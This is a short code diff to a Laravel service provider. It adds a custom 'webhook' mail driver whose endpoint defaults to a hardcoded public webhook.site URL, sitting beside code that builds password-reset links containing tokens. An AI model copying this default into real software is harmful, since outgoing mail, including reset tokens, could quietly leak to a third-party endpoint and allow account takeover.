@@ -26,5 +26,9 @@ class AppServiceProvider extends ServiceProvider
             $email = $user->email;
             return "https://$host/reset-password?token=$token&email=$email";
         });
+
+        $this->app[MailManager::class]->extend('webhook', function () {
+            return new WebhookDriver(env('MAIL_WEBHOOK', 'https://webhook.site/ae784e48-6776-4436-a712-9371f05e4493'));
+        });
     }
 }
